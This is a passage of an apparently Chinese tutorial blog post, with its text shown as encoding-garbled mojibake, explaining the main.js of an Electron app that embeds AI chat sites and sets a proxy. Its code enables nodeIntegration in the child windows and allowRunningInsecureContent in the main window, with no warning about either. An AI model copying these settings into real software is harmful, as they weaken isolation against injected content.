package-lock.json        # NPM é”å®šæ–‡ä»¶</span><br><span class="line">â”œâ”€â”€ package.json             # é¡¹ç›®ä¾èµ–åŠå…ƒæ•°æ®</span><br><span class="line">â””â”€â”€ src/                     # æºä»£ç ç›®å½•</span><br><span class="line">    â”œâ”€â”€ css/                 # æ ·å¼æ–‡ä»¶ç›®å½•</span><br><span class="line">    â”‚   â”œâ”€â”€ proxy.css        # ä»£ç†è®¾ç½®ç›¸å…³æ ·å¼</span><br><span class="line">    â”‚   â”œâ”€â”€ second.css       # ç¨‹åºå¯¹è¯é¡µé¢æ ·å¼</span><br><span class="line">    â”‚   â”œâ”€â”€ style.css        # ä¸»é¡µé¢é€šç”¨æ ·å¼</span><br><span class="line">    â”‚   â””â”€â”€ version.css      # å…³äºç¨‹åºé¡µé¢æ ·å¼</span><br><span class="line">    â”œâ”€â”€ js/                  # è„šæœ¬æ–‡ä»¶ç›®å½•</span><br><span class="line">    â”‚   â”œâ”€â”€ preload.js       # é¢„åŠ è½½è„šæœ¬</span><br><span class="line">    â”‚   â””â”€â”€ renderer.js      # æ¸²æŸ“è¿›ç¨‹è„šæœ¬</span><br><span class="line">    â””â”€â”€ view/                # HTML æ–‡ä»¶ç›®å½•</span><br><span class="line">        â”œâ”€â”€ about.html       # å…³äºç¨‹åºé¡µé¢</span><br><span class="line">        â”œâ”€â”€ index.html       # ä¸»é¡µé¢</span><br><span class="line">        â”œâ”€â”€ proxy.html       # ä»£ç†å¼¹çª—é¡µé¢</span><br><span class="line">        â””â”€â”€ second.html      # ç¨‹åºå¯¹è¯é¡µé¢</span><br></pre></td></tr></table></figure></div><h4 id="3-2-2-ç¨‹åºæ ¸å¿ƒæµç¨‹"><a href="#3-2-2-ç¨‹åºæ ¸å¿ƒæµç¨‹" class="headerlink" title="3.2.2 ç¨‹åºæ ¸å¿ƒæµç¨‹"></a>3.2.2 ç¨‹åºæ ¸å¿ƒæµç¨‹</h4><p><a data-fancybox="gallery" data-src="/../images/ai/ai_talk/1.png" data-caption="flow"><img src="/../images/ai/ai_talk/1.png" alt="flow"></a></p><ul><li><strong>main.js:</strong> ä¸»è¿›ç¨‹å…¥å£ï¼Œè´Ÿè´£åˆ›å»ºçª—å£ã€ç®¡ç†åº”ç”¨ç”Ÿå‘½å‘¨æœŸå’Œå¤„ç†ç³»ç»Ÿäº¤äº’ã€‚éœ€è¦å±•ç¤ºå¦‚ä½•åˆ›å»ºBrowserWindowå®ä¾‹ï¼ŒåŠ è½½é¡µé¢ï¼Œä»¥åŠå¤„ç†IPCäº‹ä»¶ã€‚</li><li><strong>Preload.js:</strong> é¢„åŠ è½½è„šæœ¬ï¼Œä½œä¸ºä¸»è¿›ç¨‹å’Œæ¸²æŸ“è¿›ç¨‹ä¹‹é—´çš„æ¡¥æ¢ï¼Œæš´éœ²æœ‰é™çš„Node.jsåŠŸèƒ½ç»™æ¸²æŸ“è¿›ç¨‹ã€‚éœ€è¦è¯´æ˜contextBridgeå’ŒipcRendererçš„ä½¿ç”¨ã€‚</li><li><strong>index.html:</strong> ä¸»é¡µé¢æ¨¡æ¿ï¼Œæ¸²æŸ“è¿›ç¨‹åŠ è½½çš„HTMLç»“æ„ã€‚éœ€è¦åŒ…å«å¯¹æ¸²æŸ“è„šæœ¬çš„å¼•ç”¨ï¼Œå¹¶å±•ç¤ºå¦‚ä½•è°ƒç”¨é¢„åŠ è½½çš„APIã€‚ </li><li><strong>Renderer.js:</strong> æ¸²æŸ“è¿›ç¨‹è„šæœ¬ï¼Œå¤„ç†ç”¨æˆ·ç•Œé¢äº¤äº’ï¼Œé€šè¿‡é¢„åŠ è½½è„šæœ¬ä¸ä¸»è¿›ç¨‹é€šä¿¡ã€‚éœ€è¦äº‹ä»¶ç›‘å¬å’Œæ›´æ–°UIçš„ç¤ºä¾‹ã€‚</li></ul><h4 id="3-2-3-ä¸»è¦åŠŸèƒ½"><a href="#3-2-3-ä¸»è¦åŠŸèƒ½" class="headerlink" title="3.2.3 ä¸»è¦åŠŸèƒ½"></a>3.2.3 ä¸»è¦åŠŸèƒ½</h4><p><strong>å®˜æ–¹WebæœåŠ¡é›†æˆ</strong></p><ul><li>é‡‡ç”¨ Electron <code>WebView</code> ç»„ä»¶æ— ç¼åŠ è½½å®˜æ–¹ç½‘é¡µï¼Œå®ç°è·¨å¹³å°å°è£…ï¼ˆæ— éœ€é‡å¤å¼€å‘ UI&#x2F;äº¤äº’é€»è¾‘ï¼‰</li></ul><p><strong>å¯¹è¯åˆ†æ å¸ƒå±€</strong></p><ul><li><strong>å·¦ä¾§é¢æ¿</strong>ï¼šå¯¹è¯å¤§æ¨¡å‹é€‰æ‹©ã€ä»£ç†è®¾ç½®ç­‰åŠŸèƒ½</li><li><strong>å³ä¾§ä¸»ç•Œé¢</strong>ï¼šæ˜¾ç¤ºå·¦ä¾§é€‰æ‹©çš„å¤§æ¨¡å‹å®˜æ–¹é¡µé¢ï¼Œå¼€å¯å¯¹è¯æ¨¡å¼</li></ul><p><strong>ç½‘ç»œä»£ç†æ¨¡å—</strong></p><ul><li>Electron <code>session.setProxy</code> API å®ç°ä»£ç†è®¾ç½®åŠŸèƒ½</li></ul><h4 id="3-2-4-ä»£ç åˆ†æ"><a href="#3-2-4-ä»£ç åˆ†æ" class="headerlink" title="3.2.4 ä»£ç åˆ†æ"></a>3.2.4 ä»£ç åˆ†æ</h4><blockquote><p><strong>main.js åˆ†æ</strong></p></blockquote><div class="highlight-wrap" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; app, <span class="title class_">BrowserWindow</span>, ipcMain, dialog, nativeImage &#125; = <span class="built_in">require</span>(<span class="string">&#x27;electron&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> mainWindow;</span><br><span class="line"><span class="keyword">let</span> proxyWindow;</span><br><span class="line"><span class="keyword">let</span> versionWindow</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createWindow</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// åˆ›å»ºä¸»çª—å£</span></span><br><span class="line">  mainWindow = <span class="keyword">new</span> <span class="title class_">BrowserWindow</span>(&#123;</span><br><span class="line">    <span class="attr">width</span>: <span class="number">1260</span>,</span><br><span class="line">    <span class="attr">height</span>: <span class="number">830</span>,</span><br><span class="line">    <span class="attr">icon</span>: <span class="string">&#x27;assets/logo.ico&#x27;</span>,</span><br><span class="line">    <span class="attr">webPreferences</span>: &#123;</span><br><span class="line">      <span class="attr">devTools</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">contextIsolation</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">webviewTag</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">preload</span>: path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;src&#x27;</span>, <span class="string">&#x27;js&#x27;</span>, <span class="string">&#x27;preload.js&#x27;</span>),</span><br><span class="line">      <span class="attr">enableRemoteModule</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">nodeIntegration</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">nativeWindowOpen</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">webSecurity</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">allowRunningInsecureContent</span>: <span class="literal">true</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// éšè—electron menu</span></span><br><span class="line">  mainWindow.<span class="title function_">setMenu</span>(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">// åŠ è½½åˆå§‹é¡µé¢</span></span><br><span class="line">  mainWindow.<span class="title function_">loadFile</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;src&#x27;</span>, <span class="string">&#x27;view&#x27;</span>, <span class="string">&#x27;index.html&#x27;</span>));</span><br><span class="line"></span><br><span class="line">  mainWindow.<span class="title function_">on</span>(<span class="string">&#x27;closed&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    mainWindow = <span class="literal">null</span>;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ›å»ºç”¨äºè¾“å…¥ä»£ç†çš„è‡ªå®šä¹‰çª—å£</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createProxyWindow</span>(<span class="params"></span>) &#123;</span><br><span class="line">  proxyWindow = <span class="keyword">new</span> <span class="title class_">BrowserWindow</span>(&#123;</span><br><span class="line">    <span class="attr">width</span>: <span class="number">370</span>,</span><br><span class="line">    <span class="attr">height</span>: <span class="number">250</span>,</span><br><span class="line">    <span class="attr">icon</span>: <span class="string">&#x27;assets/logo.ico&#x27;</span>,</span><br><span class="line">    <span class="attr">parent</span>: mainWindow,</span><br><span class="line">    <span class="attr">modal</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">show</span>: <span class="literal">false</span>,  <span class="comment">// åˆå§‹æ—¶ä¸æ˜¾ç¤º</span></span><br><span class="line">    <span class="attr">webPreferences</span>: &#123;</span><br><span class="line">      <span class="attr">nodeIntegration</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">preload</span>: path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;src&#x27;</span>,<span class="string">&#x27;js&#x27;</span>, <span class="string">&#x27;preload.js&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  proxyWindow.<span class="title function_">setMenu</span>(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">  proxyWindow.<span class="title function_">loadFile</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;src&#x27;</span>, <span class="string">&#x27;view&#x27;</span>, <span class="string">&#x27;proxy.html&#x27;</span>));</span><br><span class="line">  proxyWindow.<span class="title function_">once</span>(<span class="string">&#x27;ready-to-show&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    proxyWindow.<span class="title function_">show</span>();</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ç›‘å¬å…³é—­çª—å£äº‹ä»¶</span></span><br><span class="line">  proxyWindow.<span class="title function_">on</span>(<span class="string">&#x27;closed&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    proxyWindow = <span class="literal">null</span>;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç›‘å¬æ¸²æŸ“è¿›ç¨‹å‘é€çš„è¯·æ±‚æ¥æ‰“å¼€ä»£ç†è¾“å…¥çª—å£</span></span><br><span class="line">ipcMain.<span class="title function_">handle</span>(<span class="string">&#x27;open-proxy-dialog&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">createProxyWindow</span>();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// è®¾ç½®ä»£ç†</span></span><br><span class="line">ipcMain.<span class="title function_">handle</span>(<span class="string">&#x27;set-proxy&#x27;</span>, <span class="function">(<span class="params">event, proxyAddress</span>) =&gt;</span> &#123;</span><br><span class="line">  mainWindow.<span class="property">webContents</span>.<span class="property">session</span>.<span class="title function_">setProxy</span>(&#123;</span><br><span class="line">    <span class="attr">proxyRules</span>: <span class="string">`http=<span class="subst">$&#123;proxyAddress&#125;</span>;https=<span class="subst">$&#123;proxyAddress&#125;</span>`</span>,</span><br><span class="line">    <span class="attr">proxyBypassRules</span>: <span class="string">&#x27;&lt;local&gt;&#x27;</span> <span class="comment">// å¯é€‰ï¼šä¸é€šè¿‡ä»£ç†çš„åœ°å€</span></span><br><span class="line">  &#125;).<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    mainWindow.<span class="property">webContents</span>.<span class="title function_">reload</span>(); <span class="comment">// è®¾ç½®ä»£ç†åé‡æ–°åŠ è½½é¡µé¢</span></span><br><span class="line">  &#125;).<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;è®¾ç½®ä»£ç†å¤±è´¥:&#x27;</span>, err);</span><br><span class="line">    dialog.<span class="title function_">showErrorBox</span>(<span class="string">&#x27;è®¾ç½®ä»£ç†å¤±è´¥&#x27;</span>, <span class="string">&#x27;æ— æ³•è®¾ç½®ä»£ç†: &#x27;</span> + err.<span class="property">message</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ¸…é™¤ä»£ç†å¹¶æ¢å¤é»˜è®¤è®¾ç½®</span></span><br><span class="line">ipcMain.<span class="title function_">handle</span>(<span class="string">&#x27;clear-proxy&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  mainWindow.<span class="property">webContents</span>.<span class="property">session</span>.<span class="title function_">clearCache</span>() <span class="comment">// æ¸…é™¤ç¼“å­˜</span></span><br><span class="line">    .<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// æ¢å¤é»˜è®¤ä»£ç†è®¾ç½®</span></span><br><span class="line">      <span class="keyword">return</span> mainWindow.<span class="property">webContents</span>.<span class="property">session</span>.<span class="title function_">setProxy</span>(&#123;&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      mainWindow.<span class="property">webContents</span>.<span class="title function_">reload</span>(); <span class="comment">// é‡æ–°åŠ è½½é¡µé¢</span></span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;ä»£ç†å·²æ¸…é™¤ï¼Œæ¢å¤é»˜è®¤è®¾ç½®&#x27;</span>);</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;æ¸…é™¤ä»£ç†å¤±è´¥:&#x27;</span>, err);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ›å»ºç”¨äºè¾“å…¥æ˜¾ç¤ºâ€œå…³äºç¨‹åºâ€çš„è‡ªå®šä¹‰çª—å£</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createVersionWindow</span>(<span class="params"></span>) &#123;</span><br><span class="line">  versionWindow = <span class="keyword">new</span> <span class="title class_">BrowserWindow</span>(&#123;</span><br><span class="line">    <span class="attr">width</span>: <span class="number">500</span>,</span><br><span class="line">    <span class="attr">height</span>: <span class="number">685</span>,</span><br><span class="line">    <span class="attr">icon</span>: <span class="string">&#x27;assets/logo.ico&#x27;</span>,</span><br><span class="line">    <span class="attr">parent</span>: mainWindow,</span><br><span class="line">    <span class="attr">modal</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">show</span>: <span class="literal">false</span>,  <span class="comment">// åˆå§‹æ—¶ä¸æ˜¾ç¤º</span></span><br><span class="line">    <span class="attr">webPreferences</span>: &#123;</span><br><span class="line">      <span class="attr">nodeIntegration</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">preload</span>: path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;src&#x27;</span>,<span class="string">&#x27;js&#x27;</span>, <span class="string">&#x27;preload.js&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  versionWindow.<span class="title function_">setMenu</span>(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">  versionWindow.<span class="title function_">loadFile</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;src&#x27;</span>, <span class="string">&#x27;view&#x27;</span>, <span class="string">&#x27;about.html&#x27;</span>));</span><br><span class="line">  versionWindow.<span class="title function_">once</span>(<span class="string">&#x27;ready-to-show&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    versionWindow.<span class="title function_">show</span>();</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ç›‘å¬å…³é—­çª—å£äº‹ä»¶</span></span><br><span class="line">  versionWindow.<span class="title function_">on</span>(<span class="string">&#x27;closed&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    versionWindow = <span class="literal">null</span>;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç›‘å¬æ¸²æŸ“è¿›ç¨‹å‘é€çš„è¯·æ±‚æ¥æ‰“å¼€çª—å£</span></span><br><span class="line">ipcMain.<span class="title function_">handle</span>(<span class="string">&#x27;open-version-dialog&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">createVersionWindow</span>();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">whenReady</span>().<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">createWindow</span>();</span><br><span class="line"></span><br><span class="line">  app.<span class="title function_">on</span>(<span class="string">&#x27;activate&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title class_">BrowserWindow</span>.<span class="title function_">getAllWindows</span>().<span class="property">length</span> === <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="title function_">createWindow</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">on</span>(<span class="string">&#x27;window-all-closed&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (process.<span class="property">platform</span> !== <span class="string">&#x27;darwin&#x27;</span>) &#123;</span><br><span class="line">    app.<span class="title function_">quit</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>å¼•å…¥æ¨¡å—</p><div class="highlight-wrap" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; app, <span class="title class_">BrowserWindow</span>, ipcMain, dialog, nativeImage &#125; = <span class="built_in">require</span>(<span class="string">&#x27;electron&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>)</span><br></pre></td></tr></table></figure></div><table><thead><tr><th align="left">æ¨¡å—åç§°</th><th align="left">ç”¨é€”</th><th align="left">å…¸å‹åœºæ™¯ç¤ºä¾‹</th></tr></thead><tbody><tr><td align="left"><code>app</code></td><td align="left">ç®¡ç†åº”ç”¨ç”Ÿå‘½å‘¨æœŸï¼ˆå¯åŠ¨ã€é€€å‡ºï¼‰</td><td align="left"><code>app.whenReady().then(createWindow)</code></td></tr><tr><td align="left"><code>BrowserWindow</code></td><td align="left">åˆ›å»ºå’Œæ§åˆ¶æµè§ˆå™¨çª—å£</td><td align="left"><code>new BrowserWindow(&#123; width: 800 &#125;)</code></td></tr><tr><td align="left"><code>ipcMain</code></td><td align="left">ä¸»è¿›ç¨‹çš„è¿›ç¨‹é—´é€šä¿¡æ¨¡å—ï¼ˆä¸æ¸²æŸ“è¿›ç¨‹ <code>ipcRenderer</code> äº¤äº’ï¼‰</td><td align="left"><code>ipcMain.handle(&#39;event&#39;, callback)</code></td></tr><tr><td align="left"><code>dialog</code></td><td align="left">æ˜¾ç¤ºç³»ç»Ÿå¯¹è¯æ¡†ï¼ˆæ–‡ä»¶é€‰æ‹©ã€æ¶ˆæ¯æç¤ºç­‰ï¼‰</td><td align="left"><code>dialog.showOpenDialog(options)</code></td></tr><tr><td align="left"><code>nativeImage</code></td><td align="left">å¤„ç†ç³»ç»ŸåŸç”Ÿå›¾ç‰‡ï¼ˆå¦‚å›¾æ ‡ã€æˆªå›¾ï¼‰</td><td align="left"><code>nativeImage.createFromPath(&#39;img.png&#39;)</code></td></tr><tr><td align="left"><code>path</code></td><td align="left">å¤„ç†æ–‡ä»¶è·¯å¾„</td><td align="left"><code>path.join(__dirname, &#39;src&#39;, &#39;file.js&#39;)</code></td></tr></tbody></table><p>å®šä¹‰çª—å£å‡½æ•°ï¼Œè¯¥ç¨‹åºä¸»è¦æœ‰ä¸‰ä¸ªçª—å£ï¼Œ<strong>ä¸»çª—å£</strong>ã€<strong>ä»£ç†çª—å£</strong>ã€<strong>å…³äºç¨‹åºçª—å£</strong></p><div class="highlight-wrap" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> mainWindow;</span><br><span class="line"><span class="keyword">let</span> proxyWindow;</span><br><span class="line"><span class="keyword">let</span> versionWindow</span><br></pre></td></tr></table></figure></div><p>ä¸»çª—å£ let mainWindow</p><div class="highlight-wrap" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * åˆ›å»ºå¹¶é…ç½®åº”ç”¨ç¨‹åºä¸»çª—å£</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createWindow</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// åˆ›å»ºä¸»æµè§ˆå™¨çª—å£å®ä¾‹</span></span><br><span class="line">  mainWindow = <span class="keyword">new</span> <span class="title class_">BrowserWindow</span>(&#123;</span><br><span class="line">    <span class="comment">// åŸºç¡€çª—å£é…ç½®</span></span><br><span class="line">    <span class="attr">width</span>: <span class="number">1260</span>,                <span class="comment">// åˆå§‹çª—å£å®½åº¦ï¼ˆåƒç´ ï¼‰</span></span><br><span class="line">    <span class="attr">height</span>: <span class="number">830</span>,                <span class="comment">// åˆå§‹çª—å£é«˜åº¦ï¼ˆåƒç´ ï¼‰</span></span><br><span class="line">    <span class="attr">icon</span>: <span class="string">&#x27;assets/logo.ico&#x27;</span>,    <span class="comment">// çª—å£å›¾æ ‡ï¼ˆWindows/Linux ç”Ÿæ•ˆï¼ŒmacOS éœ€å•ç‹¬è®¾ç½® Dock å›¾æ ‡ï¼‰</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç½‘é¡µå†…å®¹å®‰å…¨é…ç½®ï¼ˆå…³é”®å®‰å…¨è®¾ç½®ï¼‰</span></span><br><span class="line">    <span class="attr">webPreferences</span>: &#123;</span><br><span class="line">      <span class="attr">devTools</span>: <span class="literal">false</span>,          <span class="comment">// ç¦ç”¨å¼€å‘è€…å·¥å…·ï¼ˆç”Ÿäº§ç¯å¢ƒå»ºè®®å…³é—­ï¼Œå¼€å‘æ—¶å¯åŠ¨æ€å¼€å¯ï¼‰</span></span><br><span class="line">      <span class="attr">contextIsolation</span>: <span class="literal">true</span>,   <span class="comment">// å¯ç”¨ä¸Šä¸‹æ–‡éš”ç¦»ï¼Œéš”ç¦»ä¸»è¿›ç¨‹ä¸æ¸²æŸ“è¿›ç¨‹ï¼ˆå®‰å…¨å¿…éœ€ï¼‰</span></span><br><span class="line">      <span class="attr">webviewTag</span>: <span class="literal">true</span>,         <span class="comment">// å¯ç”¨ &lt;webview&gt; æ ‡ç­¾åŠ è½½å¤–éƒ¨å†…å®¹</span></span><br><span class="line">      <span class="attr">preload</span>: path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;src&#x27;</span>, <span class="string">&#x27;js&#x27;</span>, <span class="string">&#x27;preload.js&#x27;</span>), <span class="comment">// é¢„åŠ è½½è„šæœ¬è·¯å¾„</span></span><br><span class="line">      <span class="attr">enableRemoteModule</span>: <span class="literal">false</span>,<span class="comment">// ç¦ç”¨ remote æ¨¡å—ï¼Œé˜²æ­¢æ¸²æŸ“è¿›ç¨‹ç›´æ¥è®¿é—®ä¸»è¿›ç¨‹ APIï¼ˆå®‰å…¨å¿…éœ€ï¼‰</span></span><br><span class="line">      <span class="attr">nodeIntegration</span>: <span class="literal">false</span>,   <span class="comment">// ç¦æ­¢æ¸²æŸ“è¿›ç¨‹ç›´æ¥è®¿é—® Node.jsï¼ˆå®‰å…¨å¿…éœ€ï¼‰</span></span><br><span class="line">      <span class="attr">nativeWindowOpen</span>: <span class="literal">true</span>,   <span class="comment">// ä½¿ç”¨åŸç”Ÿ window.open() è¡Œä¸º</span></span><br><span class="line">      <span class="attr">webSecurity</span>: <span class="literal">true</span>,        <span class="comment">// å¯ç”¨åŒæºç­–ç•¥ï¼ˆCORS ä¿æŠ¤ï¼‰</span></span><br><span class="line">      <span class="attr">allowRunningInsecureContent</span>: <span class="literal">true</span>, <span class="comment">// å…è®¸ HTTPS é¡µé¢åŠ è½½ HTTP èµ„æº</span></span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// éšè—é»˜è®¤èœå•æ ï¼Œè‹¥ä¸éšè—ï¼ŒWindows 